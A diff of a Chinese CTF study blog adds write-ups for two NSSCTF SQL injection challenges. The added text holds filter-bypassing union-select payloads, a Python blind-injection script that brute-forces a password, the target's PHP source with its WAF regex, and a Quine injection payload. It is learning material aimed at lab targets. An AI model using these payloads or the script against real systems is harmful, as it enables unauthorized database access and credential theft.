@@ -4,7 +4,7 @@ image: '/images/133301699_p0_master1200.jpg'
 pinned: false
 comment: true
 published: 2025-11-11
-description: "CTF 学习笔记与技术复盘"
+description: "刷题"
 category: 刷题
 tags: [刷题]
 ---
@@ -659,7 +659,7 @@ sqlmap走起。
 
 # #10.[第五空间 2021]yet_another_mysql_injection
 
-![image-20260111200052634](C:\Users\G1731\AppData\Roaming\Typora\typora-user-images\image-20260111200052634.png)
+![image-20260111200052634](/images/image-20260111200052634.png)
 
 一个正常的登入，直接1，1，尝试，发现显示only admin can login。
 
@@ -799,21 +799,219 @@ for i in range(1, 50):  #循环判断每一位密码
 
 
 
-# #11.
+# #11.[NSSCTF 2022 Spring Recruit]babysql
+
+![image-20260113141540308](/images/image-20260113141540308.png)
+
+![image-20260113133110458](/images/image-20260113133110458.png)
+
+题目就是一个简单的post sql。
+
+只有当post username=tarnish /tarnish1/ tarnish2 / tarnish3 时，才出现回显，其余的均无。
+
+fuzz几次后，正好就发现了，这个回显的黑名单，禁用了if	and	\s	#	-	空格等等。
+
+正常的--+和#注释都失败了，而且fuzz后，也能判断这题应该为字符型。
+
+`tarnish'/**/or/**/'1'='1`
+
+当测试到这里时，发现sql语句成功，且返回了tarnish的回显。
+
+根据自己的笔记，直接尝试：
+
+`1'union/**/select/**/(select/**/database())'`
+
+回显test。
+
+`1'union/**/select/**/(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='test')'`
+
+回显flag，users
+
+`1'union/**/select/**/(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag')'`
+
+回显flag。
+
+`1'union/**/select/**/(select/**/group_concat(flag)/**/from/**/test.flag)'`
+
+拿下flag。
+
+![image-20260113141459960](/images/image-20260113141459960.png)
+
+**NSSCTF{8999d535-09c8-4dd1-becf-5e808bed1c4b}**
+
+小总结：仅需判断好闭合类型和注释，就可以轻易拿下。
 
 
 
+---
 
 
 
+# #12.[NISACTF 2022]hardsql
+
+![image-20260113153134591](C:\Users\G1731\AppData\Roaming\Typora\typora-user-images\image-20260113153134591.png)
+
+题目描述里有一点提示，进入靶机，就是一个用户名和密码的页面。
+
+通过抓包，我们能发现参数为：
+
+`username=1&passwd=1&login=%E7%99%BB%E5%BD%95`
+
+login后面的参数就是登入的URL编码。
+
+将username的参数变为bilala，回显会提示密码错误，直接fuzz一下。
+
+发现 空格 = + 被过滤。
+
+想了想之前不是有一题也是类似的用户名和密码。
+
+使用/**/代替空格，like也在。
+
+用同一个脚本，稍微改一下。
+
+```
+import requests
+
+url = "http://node5.anna.nssctf.cn:26323/index.php"
+
+def to_hex(s):
+    return "0x" + s.encode().hex() + "25" 
+
+characters = "n" + "0123456789abcdefghijklmnopqrstuvwxyz{}_!"
+password_found = "" 
+
+print("正在寻找真正的 Flag...")
+
+for i in range(1, 64):
+    found_this_bit = False
+    for char in characters:
+        test_str = password_found + char
+        hex_val = to_hex(test_str)
+        # Payload: 1' or passwd like 0x[HEX]%
+        payload = f"1'/**/or/**/passwd/**/like/**/{hex_val}%23"
+        
+        data = {"username": "bilala", "passwd": payload}
+        
+        try:
+            response = requests.post(url, data=data)
+            if "wrong" in response.text:
+                password_found += char
+                print(f"[+] 发现字符: {password_found}")
+                found_this_bit = True
+                break
+        except:
+            continue
+
+    if not found_this_bit:
+        break
+
+print(f"最终结果: {password_found}")
+```
+
+爆破到密码b2f2d15b3ae082ca29697d8dcd420fd7。
+
+登入，发现：
+
+![image-20260113152807646](C:\Users\G1731\AppData\Roaming\Typora\typora-user-images\image-20260113152807646.png)
+
+还没结束，我还以为就出了。
+
+```
+<?php
+//多加了亿点点过滤
+
+include_once("config.php");
+function alertMes($mes,$url){
+  die("<script>alert('{$mes}');location.href='{$url}';</script>");
+}
+
+function checkSql($s) {
+  if(preg_match("/if|regexp|between|in|flag|=|>|<|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&|;|\\\$|char|\x0a|\x09|column|sleep|\ /i",$s)){
+    alertMes('waf here', 'index.php');
+  }
+}
+
+if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['passwd']) && $_POST['passwd'] != '') {
+  $username=$_POST['username'];
+  $password=$_POST['passwd'];
+  if ($username !== 'bilala') {
+    alertMes('only bilala can login', 'index.php');
+  }
+  checkSql($password);
+  $sql="SELECT passwd FROM users WHERE username='bilala' and passwd='$password';";
+  $user_result=mysqli_query($MysqlLink,$sql);
+  $row = mysqli_fetch_array($user_result);
+  if (!$row) {
+    alertMes('nothing found','index.php');
+  }
+  if ($row['passwd'] === $password) {
+    if($password == 'b2f2d15b3ae082ca29697d8dcd420fd7'){
+      show_source(__FILE__);
+      die;
+    }
+    else{
+      die($FLAG);
+    }
+  } else {
+    alertMes("wrong password",'index.php');
+```
+
+研究一下，发现这边有一个坑人的地方，如果我们输入值跟数据库查出的密码比较不成功，就会返回wrong password，但如果我们输入的数据等于b2f2d15b3ae082ca29697d8dcd420fd7这个，那就给我们看这段源码，想要得到flag，必须跟数据库比较成功，但又不能是b2f2d15b3ae082ca29697d8dcd420fd7这个。
+
+关键就是，我们通过脚本就爆破到了b2f2d15b3ae082ca29697d8dcd420fd7这个，说明数据库其实只有这一个密码，但要拿到flag又不能用这个密码。
+
+所以这题的做法就不是这样了。
+
+联系题目的Quine 注入。
+
+![image-20260113162455587](C:\Users\G1731\AppData\Roaming\Typora\typora-user-images\image-20260113162455587.png)
+
+研究一下，就得到了最终思路，让数据库自己复制一个跟我们输入一模一样的字符串来比较。
+
+这样就满足得到flag的条件了。
 
 
 
+> 在 SQL 中，REPLACE 函数的标准用法如下：
+>
+> 
+>
+> $$\text{REPLACE}(\text{str}, \text{old\_string}, \text{new\_string})$$
+>
+> 
+>
+> 它的功能是将字符串 str 中所有出现的 old_string 替换为 new_string。
+
+最终通过ai，也是拿到了payload。
+
+`'/**/union/**/select/**/replace(replace('"/**/union/**/select/**/replace(replace("%",0x22,0x27),0x25,"%")#',0x22,0x27),0x25,'"/**/union/**/select/**/replace(replace("%",0x22,0x27),0x25,"%")#')#`
+
+```
+以下是，比较生动的解释：
+REPLACE(
+    REPLACE(
+        '"/**/union/**/select/**/replace(replace("%",0x22,0x27),0x25,"%")#', -- 模板
+        0x22, -- 待替换：双引号	/
+        0x27  -- 替换为：单引号	/
+        '/**/union/**/select/**/replace(replace('%',0x22,0x27),0x25,'%')# /得到的内层结果
+    ),
+    0x25, -- 待替换：百分号
+    '"/**/union/**/select/**/replace(replace("%",0x22,0x27),0x25,"%")#' -- 替换为：整个模板本身
+)
+'/**/union/**/select/**/replace(replace('"/**/union/**/select/**/replace(replace("%",0x22,0x27),0x25,"%")#',0x22,0x27),0x25,'"/**/union/**/select/**/replace(replace("%",0x22,0x27),0x25,"%")#')# /得到的外层结果
+```
+
+![image-20260113152935803](C:\Users\G1731\AppData\Roaming\Typora\typora-user-images\image-20260113152935803.png)
+
+最后拿下flag。
+
+**NSSCTF{f9e48a72-d583-4632-a3d6-2d31bbbee904}**
+
+小总结：最后的这段，目前的我还是不会的，当作是学习了。
 
 
 
-
-
+---
 
 
 
